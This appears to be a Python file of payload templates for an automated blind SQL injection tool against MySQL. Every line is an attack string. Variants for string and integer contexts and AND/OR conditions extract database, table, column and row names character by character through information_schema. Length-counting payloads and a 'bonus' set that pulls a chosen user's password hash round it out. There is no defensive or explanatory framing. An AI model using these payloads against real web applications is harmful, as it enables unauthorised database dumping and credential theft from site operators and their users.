#===========================================Main Extraction Payload===============================================

#=====================START of Schema Payload with different context and conditions===============================
#context:STR and Condition: AND
str_AND_payload = "{valid_entry}' AND (SELECT CASE WHEN (SUBSTR(BINARY schema_name,{position},1)='{char}') THEN 'a' ELSE 1/0 END FROM information_schema.schemata LIMIT {limit_count},1)='a'-- -"
#context:STR and Condition: OR
str_OR_payload = "' OR (SELECT CASE WHEN (SUBSTR(BINARY schema_name,{position},1)='{char}') THEN 'a' ELSE 1/0 END FROM information_schema.schemata LIMIT {limit_count},1)='a'-- -"
#context:INT and Condition: AND
int_AND_payload = "{valid_entry} AND (SELECT CASE WHEN (SUBSTR(BINARY schema_name,{position},1)='{char}') THEN 'a' ELSE 1/0 END FROM information_schema.schemata LIMIT {limit_count},1)='a'-- -"
#context:INT and Condition: OR
int_OR_payload = "-23 OR (SELECT CASE WHEN (SUBSTR(BINARY schema_name,{position},1)='{char}') THEN 'a' ELSE 1/0 END FROM information_schema.schemata LIMIT {limit_count},1)='a'-- -"
#=====================END of Schema Payload with different context and conditions===============================

#=====================START of Table Payload with different context and conditions===============================
#context:STR and Condition: AND
table_str_AND_payload = "{valid_entry}' AND (SELECT CASE WHEN (SUBSTR(BINARY table_name,{position},1)='{char}') THEN 'a' ELSE 1/0 END FROM information_schema.tables WHERE table_schema='{schema_name}' LIMIT {limit_count},1)='a'-- -"
#context:STR and Condition: OR
table_str_OR_payload = "' OR (SELECT CASE WHEN (SUBSTR(BINARY table_name,{position},1)='{char}') THEN 'a' ELSE 1/0 END FROM information_schema.tables WHERE table_schema='{schema_name}' LIMIT {limit_count},1)='a'-- -"
#context:INT and Condition: AND
table_int_AND_payload = "{valid_entry} AND (SELECT CASE WHEN (SUBSTR(BINARY table_name,{position},1)='{char}') THEN 'a' ELSE 1/0 END FROM information_schema.tables WHERE table_schema='{schema_name}' LIMIT {limit_count},1)='a'-- -"
#context:INT and Condition: OR
table_int_OR_payload = "-43 OR (SELECT CASE WHEN (SUBSTR(BINARY table_name,{position},1)='{char}') THEN 'a' ELSE 1/0 END FROM information_schema.tables WHERE table_schema='{schema_name}' LIMIT {limit_count},1)='a'-- -"
#=====================END of Table Payload with different context and conditions===============================

#=====================START of Column Payload with different context and conditions===============================
#context:STR and Condition: AND
column_str_AND_payload = "{valid_entry}' AND (SELECT CASE WHEN (SUBSTR(BINARY column_name,{position},1)='{char}') THEN 'a' ELSE 1/0 END FROM information_schema.columns WHERE table_name='{table_name}' and table_schema='{schema_name}' LIMIT {limit_count},1)='a'-- -"
#context:STR and Condition: OR
column_str_OR_payload = "' OR (SELECT CASE WHEN (SUBSTR(BINARY column_name,{position},1)='{char}') THEN 'a' ELSE 1/0 END FROM information_schema.columns WHERE table_name='{table_name}' and table_schema='{schema_name}' LIMIT {limit_count},1)='a'-- -"
#context:INT and Condition: AND
column_int_AND_payload = "{valid_entry} AND (SELECT CASE WHEN (SUBSTR(BINARY column_name,{position},1)='{char}') THEN 'a' ELSE 1/0 END FROM information_schema.columns WHERE table_name='{table_name}' and table_schema='{schema_name}' LIMIT {limit_count},1)='a'-- -"
#context:INT and Condition: OR
column_int_OR_payload = "-43 OR (SELECT CASE WHEN (SUBSTR(BINARY column_name,{position},1)='{char}') THEN 'a' ELSE 1/0 END FROM information_schema.columns WHERE table_name='{table_name}' and table_schema='{schema_name}' LIMIT {limit_count},1)='a'-- -"
#=====================END of Column Payload with different context and conditions===============================

#=====================START of Row Payload with different context and conditions===============================
#context:STR and Condition: AND
role_str_AND_payload = "{valid_entry}' AND (SELECT CASE WHEN (SUBSTR(BINARY {column_name},{position},1)='{char}') THEN 'a' ELSE 1/0 END FROM {schema_name}.{table_name} LIMIT {limit_count},1)='a'-- -"
#context:STR and Condition: OR
role_str_OR_payload = "' OR (SELECT CASE WHEN (SUBSTR(BINARY {column_name},{position},1)='{char}') THEN 'a' ELSE 1/0 END FROM {schema_name}.{table_name} LIMIT {limit_count},1)='a'-- -"
#context:INT and Condition: AND
role_int_AND_payload = "{valid_entry} AND (SELECT CASE WHEN (SUBSTR(BINARY {column_name},{position},1)='{char}') THEN 'a' ELSE 1/0 END FROM {schema_name}.{table_name} LIMIT {limit_count},1)='a'-- -"
#context:INT and Condition: OR
role_int_OR_payload = "-43 OR (SELECT CASE WHEN (SUBSTR(BINARY {column_name},{position},1)='{char}') THEN 'a' ELSE 1/0 END FROM {schema_name}.{table_name} LIMIT {limit_count},1)='a'-- -"
#=====================END of ROW Payload with different context and conditions===============================

#=======BONUS START==========
#=====================START of Password Payload with different context and conditions===============================
#context:STR and Condition: AND
pass_str_AND_payload = "{valid_entry}' AND (SELECT CASE WHEN (SUBSTR(BINARY password,{position},1)='{char}') THEN 'a' ELSE 1/0 END FROM {schema_name}.{table_name} WHERE {column_name}='{role_name}')='a'-- -"
#context:STR and Condition: OR
pass_str_OR_payload = "' OR (SELECT CASE WHEN (SUBSTR(BINARY password,{position},1)='{char}') THEN 'a' ELSE 1/0 END FROM {schema_name}.{table_name} WHERE {column_name}='{role_name}')='a'-- -"
#context:INT and Condition: AND
pass_int_AND_payload = "{valid_entry} AND (SELECT CASE WHEN (SUBSTR(BINARY password,{position},1)='{char}') THEN 'a' ELSE 1/0 END FROM {schema_name}.{table_name} WHERE {column_name}='{role_name}')='a'-- -"
#context:INT and Condition: OR
pass_int_OR_payload = "-3 OR (SELECT CASE WHEN (SUBSTR(BINARY password,{position},1)='{char}') THEN 'a' ELSE 1/0 END FROM {schema_name}.{table_name} WHERE {column_name}='{role_name}')='a'-- -"
#=====================END of Password Payload with different context and conditions===============================
#=======BONUS END==========















#===========================================Counter Extraction Payload==============================================
#Schema count
schema_payload_and_str = "{valid}' AND (SELECT CASE WHEN (LENGTH(schema_name)>1) THEN 'a' ELSE 1/0 END FROM information_schema.schemata LIMIT {counter},1)='a'-- -"
schema_payload_and_int = "{valid} AND (SELECT CASE WHEN (LENGTH(schema_name)>1) THEN 'a' ELSE 1/0 END FROM information_schema.schemata LIMIT {counter},1)='a'-- -"
schema_payload_or_str = "' OR (SELECT CASE WHEN (LENGTH(schema_name)>1) THEN 'a' ELSE 1/0 END FROM information_schema.schemata LIMIT {counter},1)='a'-- -"
schema_payload_or_int = "-454' OR (SELECT CASE WHEN (LENGTH(schema_name)>1) THEN 'a' ELSE 1/0 END FROM information_schema.schemata LIMIT {counter},1)='a'-- -"

#Table count
table_payload_and_str = "{valid}' AND (SELECT CASE WHEN (LENGTH(table_name)>1) THEN 'a' ELSE 1/0 END FROM information_schema.tables WHERE table_schema='{schema_name}' LIMIT {counter},1)='a'-- -"
table_payload_and_int = "{valid} AND (SELECT CASE WHEN (LENGTH(table_name)>1) THEN 'a' ELSE 1/0 END FROM information_schema.tables WHERE table_schema='{schema_name}' LIMIT {counter},1)='a'-- -"
table_payload_or_str = "' OR (SELECT CASE WHEN (LENGTH(table_name)>1) THEN 'a' ELSE 1/0 END FROM information_schema.tables WHERE table_schema='{schema_name}' LIMIT {counter},1)='a'-- -"
table_payload_or_int = "-33' OR (SELECT CASE WHEN (LENGTH(table_name)>1) THEN 'a' ELSE 1/0 END FROM information_schema.tables WHERE table_schema='{schema_name}' LIMIT {counter},1)='a'-- -"

#Column count
column_payload_and_str = "{valid}' AND (SELECT CASE WHEN (LENGTH(column_name)>1) THEN 'a' ELSE 1/0 END FROM information_schema.columns WHERE table_name='{table_name}' and table_schema='{schema_name}' LIMIT {counter},1)='a'-- -"
column_payload_and_int = "{valid} AND (SELECT CASE WHEN (LENGTH(column_name)>1) THEN 'a' ELSE 1/0 END FROM information_schema.columns WHERE table_name='{table_name}' and table_schema='{schema_name}' LIMIT {counter},1)='a'-- -"
column_payload_or_str = "' OR (SELECT CASE WHEN (LENGTH(column_name)>1) THEN 'a' ELSE 1/0 END FROM information_schema.columns WHERE table_name='{table_name}' and table_schema='{schema_name}' LIMIT {counter},1)='a'-- -"
column_payload_or_int = "-11' OR (SELECT CASE WHEN (LENGTH(column_name)>1) THEN 'a' ELSE 1/0 END FROM information_schema.columns WHERE table_name='{table_name}' and table_schema='{schema_name}' LIMIT {counter},1)='a'-- -"

#RoW count
role_payload_and_str = "{valid}' AND (SELECT CASE WHEN (LENGTH({column_name})>1) THEN 'a' ELSE 1/0 END FROM {schema_name}.{table_name} LIMIT {counter},1)='a'-- -"
role_payload_and_int = "{valid} AND (SELECT CASE WHEN (LENGTH({column_name})>1) THEN 'a' ELSE 1/0 END FROM {schema_name}.{table_name} LIMIT {counter},1)='a'-- -"
role_payload_or_str = "' OR (SELECT CASE WHEN (LENGTH({column_name})>1) THEN 'a' ELSE 1/0 END FROM {schema_name}.{table_name} LIMIT {counter},1)='a'-- -"
role_payload_or_int = "-7' OR (SELECT CASE WHEN (LENGTH({column_name})>1) THEN 'a' ELSE 1/0 END FROM {schema_name}.{table_name} LIMIT {counter},1)='a'-- -"

#More like a bonus
#Getting password details length [ AND, str]
specifield_payload_and_str = "{valid}' AND (SELECT CASE WHEN (LENGTH(password)>{counter}) THEN 'a' ELSE 1/0 END FROM {schema_name}.{table_name} WHERE {column_name}='{role_name}')='a'-- -"
#Getting Specify details length [ AND, int]
specifield_payload_and_int = "{valid} AND (SELECT CASE WHEN (LENGTH(password)>{counter}) THEN 'a' ELSE 1/0 END FROM {schema_name}.{table_name} WHERE {column_name}='{role_name}')='a'-- -"
#Getting Specify details length [ OR, str]
specifield_payload_or_str = "-23' OR (SELECT CASE WHEN (LENGTH(password)>{counter}) THEN 'a' ELSE 1/0 END FROM {schema_name}.{table_name} WHERE {column_name}='{role_name}')='a'-- -"
#Getting Specify details length [ OR, int]
specifield_payload_or_int = "-343 OR (SELECT CASE WHEN (LENGTH(password)>{counter}) THEN 'a' ELSE 1/0 END FROM {schema_name}.{table_name} WHERE {column_name}='{role_name}')='a'-- -"
